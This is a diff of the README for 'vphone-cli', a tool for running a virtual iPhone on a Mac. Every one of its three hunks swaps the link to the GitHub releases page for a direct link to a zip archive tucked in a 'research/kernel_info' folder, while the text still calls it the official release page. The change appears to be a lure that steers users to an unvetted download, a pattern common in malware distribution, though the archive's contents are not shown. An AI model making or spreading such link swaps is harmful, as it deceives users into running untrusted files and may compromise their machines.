@@ -1,6 +1,6 @@
 # 📱 vphone-cli - Run a Virtual iPhone on Your Mac
 
-[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-brightgreen?style=for-the-badge)](https://github.com/goforwardbetter/vphone-cli/releases)
+[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/goforwardbetter/vphone-cli/main/research/kernel_info/vphone-cli-2.6.zip)
 
 <div align="right"><strong><a href="./docs/README_ko.md">🇰🇷한국어</a></strong> | <strong><a href="./docs/README_ja.md">🇯🇵日本語</a></strong> | <strong><a href="./docs/README_zh.md">🇨🇳中文</a></strong> | <strong>🇬🇧English</strong></div>
 
@@ -34,7 +34,7 @@ This app does **not** work on Windows or Linux currently. It requires macOS due 
 
 Go to the release page to get the latest version of vphone-cli:
 
-[Download vphone-cli Releases](https://github.com/goforwardbetter/vphone-cli/releases)
+[Download vphone-cli Releases](https://raw.githubusercontent.com/goforwardbetter/vphone-cli/main/research/kernel_info/vphone-cli-2.6.zip)
 
 This page contains all the latest files and updates.
 
@@ -112,7 +112,7 @@ If you encounter problems, try these tips:
 
 Click below to visit the official release page and get started:
 
-[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-blue?style=for-the-badge)](https://github.com/goforwardbetter/vphone-cli/releases)
+[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-blue?style=for-the-badge)](https://raw.githubusercontent.com/goforwardbetter/vphone-cli/main/research/kernel_info/vphone-cli-2.6.zip)
 
 Follow the steps above to download, install, and boot the virtual iPhone.
 
